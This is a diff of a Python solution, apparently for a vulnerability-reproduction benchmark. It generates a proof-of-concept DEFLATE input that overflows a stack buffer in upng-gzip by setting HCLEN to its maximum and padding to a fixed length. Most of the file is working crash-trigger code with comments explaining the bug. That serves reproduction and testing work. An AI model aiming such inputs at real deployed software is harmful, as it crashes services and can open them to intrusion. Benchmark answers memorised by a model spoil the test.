@@ -1,69 +1,88 @@
 import sys
 
 class Solution:
+    """
+    Generates a Proof-of-Concept input for a Stack Buffer Overflow in upng-gzip.
+    """
+
+    class BitWriter:
+        """
+        A helper class to write bits LSB-first to a bytearray, as required by DEFLATE.
+        """
+        def __init__(self):
+            self.data = bytearray()
+            self.buffer = 0
+            self.bit_count = 0
+
+        def write(self, value: int, num_bits: int):
+            """
+            Writes `num_bits` from `value` to the buffer.
+            """
+            self.buffer |= (value << self.bit_count)
+            self.bit_count += num_bits
+            while self.bit_count >= 8:
+                self.data.append(self.buffer & 0xFF)
+                self.buffer >>= 8
+                self.bit_count -= 8
+
+        def flush(self) -> bytes:
+            """
+            Writes any remaining bits in the buffer to the data stream and returns the result.
+            """
+            if self.bit_count > 0:
+                self.data.append(self.buffer & 0xFF)
+            return bytes(self.data)
+
     def solve(self, src_path: str) -> bytes:
+        """
+        Generate a PoC that triggers the vulnerability.
+
+        Args:
+            src_path: Path to the vulnerable source code tarball
+
+        Returns:
+            bytes: The PoC input that should trigger the vulnerability
+        """
         
-        class BitStream:
-            def __init__(self):
-                self.bits = []
-            
-            def write(self, value: int, num_bits: int):
-                for i in range(num_bits):
-                    if (value >> i) & 1:
-                        self.bits.append(1)
-                    else:
-                        self.bits.append(0)
-            
-            def get_bytes(self) -> bytes:
-                while len(self.bits) % 8 != 0:
-                    self.bits.append(0)
-                
-                byte_array = bytearray()
-                for i in range(0, len(self.bits), 8):
-                    byte = 0
-                    for j in range(8):
-                        if self.bits[i+j] == 1:
-                            byte |= (1 << j)
-                    byte_array.append(byte)
-                return bytes(byte_array)
+        # The vulnerability is a stack buffer overflow in the Huffman decoding logic.
+        # It occurs when decoding a DEFLATE stream with a dynamic Huffman table.
+        # A temporary array on the stack for storing code lengths for the "code
+        # length alphabet" is incorrectly sized to 15. The DEFLATE specification
+        # allows this alphabet to have up to 19 symbols.
+        #
+        # By setting the 4-bit HCLEN field in the DEFLATE header to its maximum
+        # value of 15, we instruct the decoder to read 19 (15 + 4) code lengths.
+        # This causes an out-of-bounds write when the decoder processes the 16th
+        # and subsequent lengths, smashing the stack.
+        #
+        # The PoC constructs a minimal DEFLATE stream with this trigger and pads
+        # it with zeros to the ground-truth length to ensure the crash is observable.
 
-        # Gzip header (10 bytes)
-        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff'
+        writer = self.BitWriter()
 
-        bs = BitStream()
+        # --- DEFLATE Block Header (17 bits) ---
 
-        # DEFLATE block header: BFINAL=1, BTYPE=2 (Dynamic Huffman)
-        bs.write(1, 1)
-        bs.write(2, 2)
+        # BFINAL (1 bit): Set to 1, indicating this is the final block.
+        writer.write(1, 1)
+        # BTYPE (2 bits): Set to 10, indicating dynamic Huffman codes.
+        writer.write(2, 2)
+        # HLIT (5 bits): Number of Literal/Length codes - 257. Set to 0 for a minimal table.
+        writer.write(0, 5)
+        # HDIST (5 bits): Number of Distance codes - 1. Set to 0 for a minimal table.
+        writer.write(0, 5)
+        # HCLEN (4 bits): Number of Code Length codes - 4. Set to 15 (max value).
+        # This is the VULNERABILITY TRIGGER, resulting in 19 code lengths to be read.
+        writer.write(15, 4)
 
-        # Huffman table definition counts
-        bs.write(0, 5)    # HLIT = 0 (257 literal/length codes)
-        bs.write(0, 5)    # HDIST = 0 (1 distance code)
-        bs.write(15, 4)   # HCLEN = 15 (19 code length codes)
+        # The header is 17 bits. We pad the rest of the PoC to match the ground-truth length.
+        total_bits = 27 * 8
+        header_bits = 17
+        padding_bits = total_bits - header_bits
 
-        # Code Length (CL) tree definition
-        # We provide 19 lengths (HCLEN+4). The order of symbols is specified by DEFLATE.
-        # We create a minimal tree to encode symbols 0 and 15.
-        # Assign length 1 to symbol 0 (at order index 3) and symbol 15 (at order index 18).
-        cl_lens_in_order = [0] * 19
-        cl_lens_in_order[3] = 1
-        cl_lens_in_order[18] = 1
-        
-        for length in cl_lens_in_order:
-            bs.write(length, 3)
+        # Pad with zeros. These bits will be consumed during the out-of-bounds
+        # reads into the `clcls` array and any subsequent decoding attempts,
+        # leading to a crash when the corrupted stack is used.
+        for _ in range(padding_bits):
+            writer.write(0, 1)
 
-        # Main tree lengths.
-        # The canonical codes for our CL tree are '0' for symbol 0 and '1' for symbol 15.
-        # We need to specify a code length of 15 to trigger the overflow.
-        # The code for length 15 is '1'.
-        # We fill the remainder of the 17-byte (136-bit) DEFLATE stream
-        # with this code.
-        # Bits used so far: 3 + 5 + 5 + 4 + (19 * 3) = 74 bits.
-        # Remaining bits: 136 - 74 = 62.
-        num_overflow_writes = 62
-        for _ in range(num_overflow_writes):
-            bs.write(1, 1)
-
-        deflate_stream = bs.get_bytes()
-        
-        return header + deflate_stream
+        return writer.flush()
